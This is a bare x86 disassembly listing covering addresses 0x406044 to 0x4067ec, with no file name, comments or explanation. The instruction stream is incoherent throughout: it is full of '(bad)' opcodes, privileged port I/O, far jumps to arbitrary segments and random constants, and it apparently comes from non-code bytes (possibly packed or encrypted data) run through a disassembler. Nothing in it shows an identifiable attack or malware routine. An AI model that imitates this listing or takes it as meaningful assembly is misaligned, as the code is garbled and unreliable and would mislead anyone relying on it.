  406044:	shl    BYTE PTR [ecx-0x2d],1
  406047:	sbb    esi,DWORD PTR [ecx+0xf]
  40604a:	fsubp  st(0),st
  40604c:	jnp    0x406035
  40604e:	loop   0x405fdb
  406050:	jge    0x4060ab
  406052:	jbe    0x4060c0
  406054:	xor    dl,BYTE PTR [esi]
  406056:	and    BYTE PTR [esi-0x400820c3],0xd6
  40605d:	loop   0x4060c2
  40605f:	ins    DWORD PTR es:[edi],dx
  406060:	xor    BYTE PTR [ebp+0x1c],ah
  406063:	div    BYTE PTR [ecx+0x5c]
  406066:	mov    esp,0xf7cbec5d
  40606b:	enter  0xefed,0x54
  40606f:	or     al,0x27
  406071:	scas   al,BYTE PTR es:[edi]
  406072:	mov    ds:0xcfc26426,eax
  406077:	adc    BYTE PTR [ebx-0x5e32bb04],al
  40607d:	and    eax,0x4008c594
  406082:	sbb    BYTE PTR [edx+ecx*2-0x2e],ah
  406086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406087:	fst    DWORD PTR [ebp*1+0x1906e834]
  40608e:	inc    ebp
  40608f:	mov    bl,0x1d
  406091:	data16 adc ch,BYTE PTR [esi]
  406094:	dec    BYTE PTR [eax+0xe]
  406097:	imul   esp,DWORD PTR [eax+0x53],0x355d151e
  40609e:	mov    ecx,0x6f9fc839
  4060a3:	sub    edi,DWORD PTR [ecx+esi*4]
  4060a6:	sbb    eax,0xc33dc3a3
  4060ab:	xchg   esp,eax
  4060ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ad:	pop    ds
  4060ae:	push   ss
  4060af:	mov    dh,0xa3
  4060b1:	inc    eax
  4060b2:	push   cs
  4060b3:	jne    0x4060f8
  4060b5:	mov    ds:0x14d86d30,eax
  4060ba:	sbb    edi,eax
  4060bc:	stos   DWORD PTR es:[edi],eax
  4060bd:	adc    ah,BYTE PTR [ecx]
  4060bf:	or     eax,0x961c188d
  4060c4:	retf   
  4060c5:	fiadd  WORD PTR [esi]
  4060c7:	mov    edx,0x2da2da2
  4060cc:	xor    al,0x7a
  4060ce:	or     DWORD PTR [edx],edx
  4060d0:	cs ins DWORD PTR es:[edi],dx
  4060d2:	mov    BYTE PTR [edx],bh
  4060d4:	jb     0x406153
  4060d6:	les    ebp,FWORD PTR [eax]
  4060d8:	push   es
  4060d9:	push   0x67
  4060db:	imul   ebp,DWORD PTR [esp+edx*8+0x5b],0x8d99905c
  4060e3:	retf   
  4060e4:	push   es
  4060e5:	add    edx,DWORD PTR [edx]
  4060e7:	inc    esp
  4060e8:	lock jle 0x4060cc
  4060eb:	sti    
  4060ec:	sub    DWORD PTR [eax-0x8],esp
  4060ef:	push   edx
  4060f0:	xchg   edx,eax
  4060f1:	aaa    
  4060f2:	pop    esi
  4060f3:	stos   DWORD PTR es:[edi],eax
  4060f4:	(bad)  
  4060f5:	pop    ecx
  4060f6:	in     eax,0x54
  4060f8:	pop    esp
  4060f9:	sahf   
  4060fa:	pop    ebx
  4060fb:	pop    edx
  4060fc:	xor    al,BYTE PTR [ecx-0x4103b10a]
  406102:	jno    0x4060a0
  406104:	daa    
  406105:	or     eax,0x3d5f2cbd
  40610a:	jp     0x406148
  40610c:	inc    ecx
  40610d:	xchg   ecx,eax
  40610e:	pop    ds
  40610f:	xchg   edx,eax
  406110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406111:	jg     0x406139
  406113:	shl    DWORD PTR [ecx+0x7e9058b6],cl
  406119:	dec    ebp
  40611a:	mov    al,ds:0x46639078
  40611f:	push   esi
  406120:	mov    bh,dl
  406122:	xchg   edi,eax
  406123:	lds    ecx,FWORD PTR [eax]
  406125:	ss leave 
  406127:	and    al,0x15
  406129:	test   al,0x1
  40612b:	rol    DWORD PTR [esi-0xff13765],1
  406131:	inc    ecx
  406132:	mov    bl,0xba
  406134:	je     0x4060e2
  406136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406137:	inc    edi
  406138:	lods   al,BYTE PTR ds:[esi]
  406139:	in     al,dx
  40613a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40613b:	mov    ch,0x58
  40613d:	adc    DWORD PTR [edi-0x2a6aec9e],esp
  406143:	aas    
  406144:	dec    ebp
  406145:	lea    esi,[ecx]
  406147:	xor    ebp,edx
  406149:	pusha  
  40614a:	cs imul esi,esi,0xffffffce
  40614e:	out    dx,al
  40614f:	push   eax
  406150:	pop    ds
  406151:	out    dx,al
  406152:	rcr    BYTE PTR [edi],1
  406154:	or     eax,DWORD PTR [ebp+eiz*1-0xa]
  406158:	scas   eax,DWORD PTR es:[edi]
  406159:	sbb    BYTE PTR [ecx+0x2f],bh
  40615c:	sub    edi,edx
  40615e:	pop    edi
  40615f:	sbb    al,0x9d
  406161:	shl    DWORD PTR [edx+0x15],1
  406164:	test   al,0x81
  406166:	adc    al,0x99
  406168:	scas   al,BYTE PTR es:[edi]
  406169:	sub    dl,BYTE PTR [edi+0x37a186e9]
  40616f:	sub    WORD PTR [ebx],0x3f
  406173:	sub    bl,dh
  406175:	(bad)  
  406176:	mov    esi,0x63eccbd9
  40617b:	xchg   esi,eax
  40617c:	jns    0x40617d
  40617e:	loope  0x4061c5
  406180:	std    
  406181:	test   BYTE PTR [eax+0x2b17a8f5],0xaa
  406188:	addr16 aad 0x47
  40618b:	xchg   BYTE PTR [edx],bh
  40618d:	pop    DWORD PTR [ebx+0x74a66235]
  406193:	aam    0x5b
  406195:	inc    eax
  406196:	adc    ah,bh
  406198:	dec    edx
  406199:	jne    0x4061ea
  40619b:	aad    0x48
  40619d:	clc    
  40619e:	in     ax,dx
  4061a0:	sub    DWORD PTR [ecx+0x6824c0bf],0x3d844273
  4061aa:	pop    edi
  4061ab:	pop    ecx
  4061ac:	push   0xe573f2e7
  4061b1:	add    al,0x63
  4061b3:	inc    edx
  4061b4:	pop    ebx
  4061b5:	loope  0x406152
  4061b7:	popf   
  4061b8:	sub    eax,0x20e48840
  4061bd:	imul   esi,eax,0x563953fb
  4061c3:	jmp    0xe6af:0x84d6b941
  4061ca:	or     ah,dh
  4061cc:	pop    ecx
  4061cd:	pushf  
  4061ce:	call   0x73fe4dae
  4061d3:	xor    bh,BYTE PTR [eax-0x33]
  4061d6:	jb     0x4061bf
  4061d8:	or     BYTE PTR [edx+ecx*8],dh
  4061db:	pop    esp
  4061dc:	jle    0x406211
  4061de:	lea    ecx,[edi]
  4061e0:	es sbb eax,0x2ccc098f
  4061e6:	xchg   ecx,eax
  4061e7:	dec    eax
  4061e8:	cmp    ebp,esp
  4061ea:	xchg   DWORD PTR [edx],edi
  4061ec:	lahf   
  4061ed:	fwait
  4061ee:	aas    
  4061ef:	xchg   ebx,eax
  4061f0:	loopne 0x406213
  4061f2:	xchg   ebx,eax
  4061f3:	and    bh,cl
  4061f5:	in     al,dx
  4061f6:	out    dx,al
  4061f7:	in     al,dx
  4061f8:	push   cs
  4061f9:	or     ebp,DWORD PTR [eax-0x19]
  4061fc:	jmp    0xd48416d8
  406201:	aad    0x7d
  406203:	mov    edx,0x38453bca
  406208:	cdq    
  406209:	mov    ebp,0x1215e4a6
  40620e:	inc    esi
  40620f:	js     0x4061cc
  406211:	push   ds
  406212:	jg     0x40623e
  406214:	inc    ecx
  406215:	lods   eax,DWORD PTR ds:[esi]
  406216:	pop    edi
  406217:	bound  edi,QWORD PTR [edi]
  406219:	pushf  
  40621a:	jl     0x40627a
  40621c:	xor    al,0xb1
  40621e:	pop    ebx
  40621f:	adc    edi,DWORD PTR [eax]
  406221:	cld    
  406222:	or     eax,0xf6888bff
  406227:	push   es
  406228:	adc    bl,BYTE PTR [esi+eiz*4-0x225cebb1]
  40622f:	sbb    DWORD PTR [eax+0x9c4d3db],ecx
  406235:	sub    cl,bl
  406237:	retf   0x71ec
  40623a:	or     BYTE PTR [eax],ah
  40623c:	dec    esi
  40623d:	add    edi,DWORD PTR [ebp-0x4]
  406240:	or     bh,BYTE PTR [ecx-0x34]
  406243:	(bad)  
  406244:	shl    bh,1
  406246:	xchg   ebx,eax
  406247:	mov    ebx,0x313e32b6
  40624c:	jo     0x406282
  40624e:	mov    WORD PTR [ebx],cs
  406250:	xor    BYTE PTR [esi],0x78
  406253:	jge    0x4062b6
  406255:	pushf  
  406256:	stc    
  406257:	mov    edx,0xd41d613f
  40625c:	push   ds
  40625d:	or     ah,BYTE PTR fs:[esi]
  406260:	fsubr  QWORD PTR [edi]
  406262:	pop    ebp
  406263:	cmc    
  406264:	es mov esp,0x78ef5022
  40626a:	pop    ss
  40626b:	xor    DWORD PTR [edx+0x15],esi
  40626e:	mov    al,0xc0
  406270:	xchg   esi,eax
  406271:	dec    eax
  406272:	call   DWORD PTR [eax-0x21695ea7]
  406278:	and    dh,BYTE PTR [esi+0x786f7b92]
  40627e:	sub    BYTE PTR [ecx-0xe],0xc6
  406282:	scas   eax,DWORD PTR es:[edi]
  406283:	imul   ebx,DWORD PTR ds:0xa767e2cf,0xd
  40628a:	out    dx,eax
  40628b:	pusha  
  40628c:	lods   al,BYTE PTR ds:[esi]
  40628d:	daa    
  40628e:	mov    bh,0xb0
  406290:	sahf   
  406291:	push   edx
  406292:	mov    esp,0xb9c2d36a
  406297:	jno    0x406302
  406299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40629a:	js     0x406284
  40629c:	inc    edx
  40629d:	fbld   TBYTE PTR [ecx+0x6976313e]
  4062a3:	xor    al,0x58
  4062a5:	ficom  DWORD PTR [edx]
  4062a7:	mov    esp,0x99a0e94d
  4062ac:	pop    eax
  4062ad:	scas   eax,DWORD PTR es:[edi]
  4062ae:	sahf   
  4062af:	je     0x4062ec
  4062b1:	ss (bad) 
  4062b3:	popa   
  4062b4:	sub    BYTE PTR [edx+0x2],ch
  4062b7:	inc    esi
  4062b8:	cli    
  4062b9:	add    dl,BYTE PTR [edi-0x17]
  4062bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062bd:	dec    esp
  4062be:	mov    dl,0x63
  4062c0:	xchg   edx,eax
  4062c1:	scas   eax,DWORD PTR es:[edi]
  4062c2:	mov    cl,0xf3
  4062c4:	jno    0x406283
  4062c6:	sub    al,0x4c
  4062c8:	ret    
  4062c9:	test   DWORD PTR [edi-0x46],0x5b608150
  4062d0:	outs   dx,DWORD PTR ds:[esi]
  4062d1:	gs push cs
  4062d3:	pop    ebx
  4062d4:	std    
  4062d5:	jmp    0x4062cb
  4062d7:	int3   
  4062d8:	mov    bl,dh
  4062da:	aaa    
  4062db:	sub    ah,BYTE PTR [ecx-0x19]
  4062de:	jle    0x4062c7
  4062e0:	aam    0xa7
  4062e2:	std    
  4062e3:	mov    ds:0x98076931,al
  4062e8:	stc    
  4062e9:	in     al,dx
  4062ea:	mov    ebx,ss
  4062ec:	mov    ebp,0x734f3641
  4062f1:	ss mov edi,0xde64ac11
  4062f7:	sub    al,BYTE PTR fs:[edx-0x14]
  4062fb:	int3   
  4062fc:	push   ss
  4062fd:	push   cs
  4062fe:	push   esi
  4062ff:	dec    BYTE PTR [edi-0x5e]
  406302:	push   0xffffffe1
  406304:	lds    ecx,FWORD PTR [eax+ebp*8+0x48157426]
  40630b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40630c:	aam    0x59
  40630e:	mov    ?,WORD PTR [eax-0x61]
  406311:	or     edx,DWORD PTR [eax+0x44c835ef]
  406317:	out    0x48,al
  406319:	add    al,0x52
  40631b:	sahf   
  40631c:	pop    eax
  40631d:	aas    
  40631e:	stos   BYTE PTR es:[edi],al
  40631f:	mov    esp,0x450033e2
  406324:	mov    ebx,0x23641197
  406329:	pop    ecx
  40632a:	and    al,0x46
  40632c:	pop    eax
  40632d:	loop   0x406389
  40632f:	mov    bh,0x38
  406331:	inc    edi
  406332:	mov    al,BYTE PTR [ebp+0x1d]
  406335:	pop    esp
  406336:	add    eax,0x559bee52
  40633b:	and    ecx,DWORD PTR [ebp-0x3a]
  40633e:	xchg   edi,eax
  40633f:	int3   
  406340:	push   eax
  406341:	xlat   BYTE PTR ds:[ebx]
  406342:	mov    al,ds:0x5b9d4aea
  406347:	in     eax,0xf5
  406349:	sub    ebx,DWORD PTR [ebp-0x2e9926fe]
  40634f:	loope  0x4063cf
  406351:	cmp    DWORD PTR [edi],edi
  406353:	leave  
  406354:	fnsave [eax+esi*4]
  406357:	sbb    BYTE PTR ds:0x59f98b01,ah
  40635d:	xor    BYTE PTR [edx+0xf638b7d],cl
  406363:	pop    ecx
  406364:	pusha  
  406365:	lahf   
  406366:	push   ss
  406367:	js     0x4063e8
  406369:	mov    bh,0x1
  40636b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40636c:	jmp    0xa4e36b15
  406371:	loopne 0x40634f
  406373:	or     DWORD PTR [ecx+0x37599308],ecx
  406379:	repnz retf 0xcb30
  40637d:	leave  
  40637e:	adc    BYTE PTR [ebp-0xe],0xdc
  406382:	add    bl,dh
  406384:	aas    
  406385:	adc    ecx,eax
  406387:	test   DWORD PTR [edi-0xbdb8c79],0xbaa8736e
  406391:	mov    bh,0x33
  406393:	jle    0x40632f
  406395:	dec    esp
  406396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406397:	jp     0x4063bc
  406399:	mov    esi,0x64fca8
  40639e:	nop
  40639f:	xchg   ebp,eax
  4063a0:	pop    edx
  4063a1:	pop    edi
  4063a2:	outs   dx,BYTE PTR ds:[esi]
  4063a3:	repnz xor BYTE PTR [eax+0x33d96744],bl
  4063aa:	push   edi
  4063ab:	push   ss
  4063ac:	inc    esp
  4063ad:	sbb    eax,0xd16f429
  4063b2:	sbb    cl,BYTE PTR [ebx]
  4063b4:	int    0x1e
  4063b6:	sub    BYTE PTR [edi+0x1f],ah
  4063b9:	sar    edi,1
  4063bb:	icebp  
  4063bc:	in     al,0x52
  4063be:	jns    0x4063e8
  4063c0:	add    esp,DWORD PTR [edx-0x7a13b845]
  4063c6:	mov    ah,0x83
  4063c8:	scas   eax,DWORD PTR es:[edi]
  4063c9:	and    ah,BYTE PTR [ebp-0x64fd08c6]
  4063cf:	or     BYTE PTR [edx-0x21],0xbd
  4063d3:	xchg   esi,eax
  4063d4:	mov    dl,0x92
  4063d6:	fstp   TBYTE PTR [ecx+0x4a]
  4063d9:	lahf   
  4063da:	mov    edi,0x7e9a5a9
  4063df:	sbb    al,0x21
  4063e1:	mov    cl,0x4a
  4063e3:	inc    esi
  4063e4:	icebp  
  4063e5:	sub    al,0x2
  4063e7:	mov    al,0x6
  4063e9:	add    eax,0x75faf0a
  4063ee:	in     eax,0xbd
  4063f0:	pop    eax
  4063f1:	test   DWORD PTR [ebx-0x43fcf456],ebp
  4063f7:	fdivr  QWORD PTR [ecx]
  4063f9:	push   ebx
  4063fa:	popa   
  4063fb:	ds mov esp,0xba6d3a96
  406401:	outs   dx,BYTE PTR ds:[esi]
  406402:	push   0x780aaf1d
  406407:	jnp    0x4063a4
  406409:	retf   0x7599
  40640c:	pop    ds
  40640d:	xchg   DWORD PTR [ecx-0x72],esp
  406410:	cmp    ecx,DWORD PTR [ebx]
  406412:	or     BYTE PTR [edx],al
  406414:	pcmpgtb mm4,QWORD PTR [edi-0x644f1e46]
  40641b:	mov    edi,0x3be2759b
  406420:	inc    eax
  406421:	in     eax,dx
  406422:	push   eax
  406423:	mov    al,ds:0x46b1feb3
  406428:	in     al,0x92
  40642a:	add    bl,0xd6
  40642d:	rcr    BYTE PTR [ecx],0x24
  406430:	xchg   esi,eax
  406431:	clc    
  406432:	push   ds
  406433:	xlat   BYTE PTR ds:[ebx]
  406434:	scas   al,BYTE PTR es:[edi]
  406435:	adc    esp,DWORD PTR [ebp+0x746f89e9]
  40643b:	xchg   ecx,eax
  40643c:	lock mov esi,ebp
  40643f:	rcl    BYTE PTR [ebx+0x65],1
  406442:	push   ss
  406443:	inc    eax
  406444:	inc    ebp
  406445:	mov    esp,0x8980c8ff
  40644a:	cmp    eax,0x287fbc07
  40644f:	pop    esp
  406450:	add    ebp,DWORD PTR [eax-0x22b15da2]
  406456:	push   ecx
  406457:	stos   DWORD PTR es:[edi],eax
  406458:	das    
  406459:	add    ch,BYTE PTR [ebp+edx*8+0x7d]
  40645d:	add    eax,0xf4cc0d71
  406462:	fistp  QWORD PTR [ebx+0x67]
  406465:	push   ss
  406466:	fisubr WORD PTR [edi+edx*2]
  406469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40646a:	out    0xb7,eax
  40646c:	bound  edi,QWORD PTR [ebp-0x7e715722]
  406472:	xlat   BYTE PTR ds:[ebx]
  406473:	rcl    DWORD PTR [eax+ecx*1],1
  406476:	pop    es
  406477:	(bad)  
  406478:	js     0x40648f
  40647a:	adc    al,0xa2
  40647c:	dec    edx
  40647d:	xor    al,bl
  40647f:	add    eax,DWORD PTR [esi]
  406481:	aaa    
  406482:	mov    ch,0xa6
  406484:	in     eax,dx
  406485:	mov    eax,0x4fd26208
  40648a:	iret   
  40648b:	and    eax,0x3b6a39
  406490:	sub    esi,ecx
  406492:	mov    al,ds:0x268ecc8e
  406497:	xchg   edx,eax
  406498:	push   DWORD PTR [ebp+0x7563d9fa]
  40649e:	push   esi
  40649f:	lock ins DWORD PTR es:[edi],dx
  4064a1:	mov    ebp,ebp
  4064a3:	jns    0x4064b9
  4064a5:	sbb    al,0x80
  4064a7:	inc    ebx
  4064a8:	(bad)  
  4064a9:	lock and BYTE PTR [ebx],0x12
  4064ad:	inc    esi
  4064ae:	mov    edi,0xbedcc269
  4064b3:	(bad)  
  4064b4:	bound  ecx,QWORD PTR [ebx+0x5c]
  4064b7:	mov    eax,ds:0x56f568ef
  4064bc:	outs   dx,BYTE PTR gs:[esi]
  4064be:	call   0x7afc:0xb33c1bcc
  4064c5:	cmp    bh,al
  4064c7:	lds    eax,FWORD PTR [ecx]
  4064c9:	out    dx,eax
  4064ca:	jge    0x40652d
  4064cc:	pop    edx
  4064cd:	scas   al,BYTE PTR es:[edi]
  4064ce:	add    BYTE PTR [eax+edi*8],ah
  4064d1:	icebp  
  4064d2:	push   es
  4064d3:	mov    eax,0x99b5016d
  4064d8:	sub    DWORD PTR [eax],0x2b
  4064db:	or     BYTE PTR [ecx+0x26],dh
  4064de:	and    eax,0xe7aeb873
  4064e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064e4:	cmp    al,BYTE PTR [eax]
  4064e6:	mov    edi,0x243df74
  4064eb:	xor    ah,0xea
  4064ee:	(bad)  
  4064ef:	mov    edi,0x933f2452
  4064f4:	fnclex 
  4064f6:	icebp  
  4064f7:	pop    ecx
  4064f8:	aad    0x82
  4064fa:	and    al,BYTE PTR [edx-0x294701e5]
  406500:	xchg   ecx,eax
  406501:	jge    0x4064b2
  406503:	clc    
  406504:	cs int3 
  406506:	fist   WORD PTR [eax]
  406508:	or     edx,0x47
  40650b:	call   0xc485:0xf0f5983f
  406512:	mov    esi,ecx
  406514:	sbb    al,0x82
  406516:	and    dh,BYTE PTR [ebx+0x60]
  406519:	jns    0x406510
  40651b:	mov    bl,0x75
  40651d:	or     ebx,DWORD PTR [edi+0x40e6202]
  406523:	scas   eax,DWORD PTR es:[edi]
  406524:	in     al,dx
  406525:	xor    ah,BYTE PTR ds:0x23e40850
  40652b:	imul   ebp,DWORD PTR [ecx+0xb1dff85],0xffffffcf
  406532:	rcr    BYTE PTR [ecx],cl
  406534:	jecxz  0x4065a9
  406536:	cmp    BYTE PTR [esi],ch
  406538:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40653a:	gs sbb ebx,eax
  40653d:	or     al,0x62
  40653f:	push   0xfffffffd
  406541:	dec    esp
  406542:	test   ch,al
  406544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406545:	clc    
  406546:	shl    BYTE PTR [esi+edi*1+0x704b9705],1
  40654d:	sar    DWORD PTR [ecx],cl
  40654f:	mov    esp,0xa272bb83
  406554:	mov    ebx,0x62c406ea
  406559:	jbe    0x40653e
  40655b:	mov    bl,0x62
  40655d:	loop   0x4065a9
  40655f:	hlt    
  406560:	xlat   BYTE PTR ds:[ebx]
  406561:	iret   
  406562:	push   0xc06e4d76
  406567:	jb     0x406535
  406569:	ja     0x406561
  40656b:	inc    edx
  40656c:	call   0xdc5f8993
  406571:	add    cl,BYTE PTR [ecx]
  406573:	mov    ecx,0x7bc49f48
  406578:	mov    ecx,DWORD PTR ds:0x5baf3989
  40657e:	les    bp,DWORD PTR [ebx+ebp*1]
  406582:	xchg   edi,eax
  406583:	inc    ebx
  406584:	loop   0x406579
  406586:	pop    ecx
  406587:	mov    esp,0xcf3e52ca
  40658c:	stc    
  40658d:	dec    esi
  40658e:	add    dl,bh
  406590:	or     edx,DWORD PTR [ebx+0x33]
  406593:	je     0x4065a0
  406595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406596:	xchg   edi,ebx
  406598:	cmp    al,0x6b
  40659a:	shr    DWORD PTR [esi-0x20],0x55
  40659e:	fisub  WORD PTR [ebp-0x56]
  4065a1:	test   BYTE PTR [eax+0x48],dl
  4065a4:	shl    DWORD PTR [esi+0x7fcad208],0x67
  4065ab:	pop    ds
  4065ac:	and    esi,DWORD PTR fs:[esi-0xecb6e14]
  4065b3:	test   BYTE PTR [ecx-0x69],cl
  4065b6:	dec    ebx
  4065b7:	icebp  
  4065b8:	xlat   BYTE PTR ds:[ebx]
  4065b9:	jecxz  0x4065c3
  4065bb:	xor    ch,al
  4065bd:	(bad)  
  4065be:	out    0xd3,al
  4065c0:	aaa    
  4065c1:	mov    eax,ds:0x2d89cee2
  4065c6:	inc    edx
  4065c7:	loopne 0x406608
  4065c9:	mov    ds:0xf1153c2a,al
  4065ce:	mov    bl,0x9e
  4065d0:	ss dec edx
  4065d2:	(bad)  
  4065d4:	dec    edx
  4065d5:	pushf  
  4065d6:	ds ret 
  4065d8:	inc    esp
  4065d9:	stos   DWORD PTR es:[edi],eax
  4065da:	outs   dx,BYTE PTR ds:[esi]
  4065db:	sar    DWORD PTR [ecx+edx*8+0x4a73a8d2],cl
  4065e2:	cs push 0x1af87c3d
  4065e8:	mov    cs,WORD PTR [ebx+0x5bb780d7]
  4065ee:	imul   eax,DWORD PTR [ebx],0x28
  4065f1:	lea    esi,[ebp+0x3e]
  4065f4:	sar    dh,cl
  4065f6:	pop    ds
  4065f7:	mov    eax,0x8e84a70a
  4065fc:	mov    edx,0x4668866c
  406601:	lahf   
  406602:	add    eax,0xbf96bc96
  406607:	sar    DWORD PTR [edi],0x25
  40660a:	shr    DWORD PTR [edx],cl
  40660c:	xchg   DWORD PTR [ebx+0x7f],eax
  40660f:	aas    
  406610:	mov    BYTE PTR [edi+0x5dcb3ca4],bl
  406616:	or     edx,esi
  406618:	arpl   WORD PTR [esi-0x78],sp
  40661b:	hlt    
  40661c:	das    
  40661d:	push   ecx
  40661e:	inc    esi
  40661f:	jecxz  0x406666
  406621:	adc    BYTE PTR [edx-0x17fc3f87],0x36
  406628:	shl    BYTE PTR [ebx],1
  40662a:	das    
  40662b:	inc    esp
  40662c:	in     al,dx
  40662d:	mov    esi,0x1a23df2c
  406632:	mov    edi,0xa05b054d
  406637:	inc    BYTE PTR [edi+0x447b98f3]
  40663d:	enter  0x9bd1,0xa2
  406641:	inc    ebx
  406642:	stos   DWORD PTR es:[edi],eax
  406643:	outs   dx,DWORD PTR ds:[esi]
  406644:	es mov bh,0x55
  406647:	xor    eax,0xd3356f77
  40664c:	fwait
  40664d:	and    BYTE PTR [esi+0xa],bl
  406650:	(bad)  
  406652:	sbb    edi,DWORD PTR [ebx]
  406654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406655:	sar    BYTE PTR [ebp+0x4a77bbe0],1
  40665b:	mov    ch,0x8a
  40665d:	(bad)  
  40665f:	sbb    cl,BYTE PTR [eax+esi*4-0x3d67661]
  406666:	imul   esp,DWORD PTR [esi-0xb],0x48
  40666a:	pop    eax
  40666b:	or     BYTE PTR [edi+esi*2+0x602782aa],ch
  406672:	inc    eax
  406673:	aaa    
  406674:	xchg   ebp,eax
  406675:	mov    bl,0x65
  406677:	dec    eax
  406678:	adc    dh,dh
  40667a:	ss mov esi,0x7253f7bf
  406680:	inc    ecx
  406681:	js     0x40661e
  406683:	xchg   edx,eax
  406684:	dec    edi
  406685:	sub    dh,cl
  406687:	sti    
  406688:	push   0x6b61b3d2
  40668d:	in     eax,dx
  40668e:	and    cl,al
  406690:	add    eax,0xe53867d8
  406695:	mov    dl,0xb6
  406697:	das    
  406698:	sbb    eax,0xca9f19fe
  40669d:	push   edx
  40669e:	mov    ebp,0x4a60a0e5
  4066a3:	inc    ebp
  4066a4:	inc    esp
  4066a5:	inc    edx
  4066a6:	jnp    0x406642
  4066a8:	fisub  DWORD PTR [eax+0x6753b443]
  4066ae:	sub    al,0x31
  4066b0:	mov    eax,ds:0x6c3a84c3
  4066b5:	fsub   QWORD PTR [esi+0x75a8a439]
  4066bb:	adc    ebx,ebp
  4066bd:	imul   bl
  4066bf:	sub    ch,dl
  4066c1:	hlt    
  4066c2:	adc    bl,BYTE PTR [ebx+ecx*1+0xd9c58dd]
  4066c9:	ds int 0x39
  4066cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066cd:	sar    DWORD PTR [edx],1
  4066cf:	daa    
  4066d0:	cli    
  4066d1:	imul   ebp,DWORD PTR [edi+0x1781c832],0xffffffc5
  4066d8:	push   ebx
  4066d9:	rcr    esp,0xe1
  4066dc:	adc    BYTE PTR [ebx+0x3195218a],0xf9
  4066e3:	xchg   ebx,eax
  4066e4:	shl    dh,cl
  4066e6:	jne    0x4066e8
  4066e8:	fisttp QWORD PTR [eax+0x1c6d9677]
  4066ee:	sbb    BYTE PTR [edx],dh
  4066f0:	push   eax
  4066f1:	fucomip st,st(2)
  4066f3:	test   al,0xe0
  4066f5:	xlat   BYTE PTR ds:[ebx]
  4066f6:	sahf   
  4066f7:	and    DWORD PTR [ebx+0x5a],ebp
  4066fa:	pop    esi
  4066fb:	adc    eax,0xa58bb6aa
  406700:	test   ebp,ecx
  406702:	sbb    bh,bl
  406704:	jns    0x406735
  406706:	cmp    eax,0x435cedf3
  40670b:	jl     0x4066e0
  40670d:	div    bl
  40670f:	call   FWORD PTR es:[edi]
  406712:	adc    al,0x47
  406714:	jo     0x406751
  406716:	ins    DWORD PTR es:[edi],dx
  406717:	sahf   
  406718:	inc    eax
  406719:	jns    0x4066c0
  40671b:	aas    
  40671c:	mov    cl,0x8f
  40671e:	pop    ds
  40671f:	jne    0x4066b3
  406721:	pushf  
  406722:	call   FWORD PTR [eax]
  406724:	bound  ecx,QWORD PTR [esi+0x65de6008]
  40672a:	mov    ebx,0x16fd05b9
  40672f:	scas   eax,DWORD PTR es:[edi]
  406730:	test   eax,0xfbd11b2c
  406735:	test   ebp,0xb47009b8
  40673b:	dec    esi
  40673c:	sub    eax,0xf5c1ff0f
  406741:	test   DWORD PTR [ebp+0x36],0xcea1148a
  406748:	mov    dl,0x9
  40674a:	cmp    esp,DWORD PTR [ecx]
  40674c:	pop    es
  40674d:	aaa    
  40674e:	rol    DWORD PTR [edi],1
  406750:	inc    eax
  406751:	les    esi,FWORD PTR [ebp+0x1ca28ab7]
  406757:	stos   DWORD PTR es:[edi],eax
  406758:	je     0x40678d
  40675a:	fistp  QWORD PTR [ecx+0x2f]
  40675d:	imul   ebp,edi,0x8559769
  406763:	ins    DWORD PTR es:[edi],dx
  406764:	je     0x406730
  406766:	mov    ds:0xae891eb0,eax
  40676b:	xor    dl,BYTE PTR [esp+edx*1+0x7f0c65b9]
  406772:	jge    0x4067e5
  406774:	sbb    ebx,DWORD PTR [eax]
  406776:	out    dx,al
  406777:	pushf  
  406778:	(bad)  
  406779:	mov    WORD PTR [ebp+0x38e56c0f],ss
  40677f:	dec    edi
  406780:	loope  0x4067da
  406782:	sub    eax,0x1e6c8a7f
  406787:	cmp    eax,0xa94d3c39
  40678c:	pop    ebp
  40678d:	fiadd  WORD PTR [edx+esi*8]
  406790:	dec    ebx
  406791:	adc    DWORD PTR [ebx*4+0x3e4ef91b],0xbf4d74
  40679c:	sbb    al,0x33
  40679e:	repz popf 
  4067a0:	pop    esi
  4067a1:	lds    edx,FWORD PTR [ecx+0x73]
  4067a4:	mov    edi,0xe311ce75
  4067a9:	push   ecx
  4067aa:	int    0x97
  4067ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067ad:	in     al,0x6
  4067af:	cmp    eax,ebp
  4067b1:	leave  
  4067b2:	iretw  
  4067b4:	pop    esi
  4067b5:	scas   al,BYTE PTR es:[edi]
  4067b6:	dec    ecx
  4067b7:	(bad)  
  4067b8:	and    ebp,edi
  4067ba:	stos   DWORD PTR es:[edi],eax
  4067bb:	fist   DWORD PTR [ecx-0x14b35950]
  4067c1:	mov    DWORD PTR [eax],esi
  4067c3:	ins    BYTE PTR es:[edi],dx
  4067c4:	pop    esp
  4067c5:	leave  
  4067c6:	sbb    esi,DWORD PTR [ebx-0x65]
  4067c9:	jno    0x4067f1
  4067cb:	gs sbb edx,ebx
  4067ce:	mov    dh,0x6c
  4067d0:	(bad)  [edi-0x16]
  4067d3:	add    al,ah
  4067d5:	inc    eax
  4067d6:	sahf   
  4067d7:	aam    0x31
  4067d9:	pop    esp
  4067da:	in     al,dx
  4067db:	out    dx,eax
  4067dc:	sbb    dl,dl
  4067de:	das    
  4067df:	dec    esi
  4067e0:	jnp    0x406848
  4067e2:	js     0x4067d0
  4067e4:	pcmpgtd mm7,mm2
  4067e7:	fld    DWORD PTR [ebx-0x2f]
  4067ea:	mov    cl,0xd8
  4067ec:	mov    cl,0xfa
